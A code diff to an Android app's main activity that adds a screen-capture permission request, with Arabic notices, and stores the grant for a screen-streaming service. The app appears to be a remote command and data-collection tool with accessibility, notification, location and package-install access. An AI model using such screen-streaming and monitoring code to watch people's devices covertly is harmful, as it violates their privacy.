@@ -6,6 +6,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -22,6 +23,7 @@ import com.abuzahra.manager.executor.DataCollector
 import com.abuzahra.manager.service.CommandService
 import com.abuzahra.manager.service.MyAccessibilityService
 import com.abuzahra.manager.service.MyNotificationListenerService
+import com.abuzahra.manager.streaming.ScreenStreamService
 import com.abuzahra.manager.util.DeviceUtils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -42,6 +44,7 @@ class MainActivity : AppCompatActivity() {
         private const val REQUEST_CODE_BATTERY_OPT = 1010
         private const val REQUEST_CODE_INSTALL_PACKAGES = 1011
         private const val REQUEST_CODE_UNKNOWN_APPS = 1012
+        private const val REQUEST_CODE_SCREEN_CAPTURE = 1013
     }
 
     private var currentPermissionIndex = 0
@@ -81,6 +84,9 @@ class MainActivity : AppCompatActivity() {
 
         // Ensure service is running
         CommandService.start(this)
+
+        // Request MediaProjection permission proactively for streaming
+        requestMediaProjectionPermission()
 
         // Update permissions count
         updatePermissionCount(textPermissions)
@@ -436,6 +442,39 @@ class MainActivity : AppCompatActivity() {
                     arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                     REQUEST_CODE_LOCATION
                 )
+            }
+        }
+    }
+
+    /**
+     * Request MediaProjection permission for screen streaming.
+     * This must be requested from an Activity and the result saved for later use.
+     */
+    private fun requestMediaProjectionPermission() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return
+        if (ScreenStreamService.hasPermission()) return
+        try {
+            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val intent = projectionManager.createScreenCaptureIntent()
+            @Suppress("DEPRECATION")
+            startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE)
+            Toast.makeText(this, "🎬 يرجى الموافقة على تسجيل الشاشة للبث المباشر", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "Failed to request MediaProjection", e)
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                ScreenStreamService.setPermissionData(resultCode, data)
+                android.util.Log.i("MainActivity", "MediaProjection permission granted and saved")
+                Toast.makeText(this, "✅ تم حفظ إذن تسجيل الشاشة", Toast.LENGTH_SHORT).show()
+            } else {
+                android.util.Log.w("MainActivity", "MediaProjection permission denied")
+                Toast.makeText(this, "⚠️ تم رفض إذن تسجيل الشاشة - البث لن يعمل", Toast.LENGTH_LONG).show()
             }
         }
     }
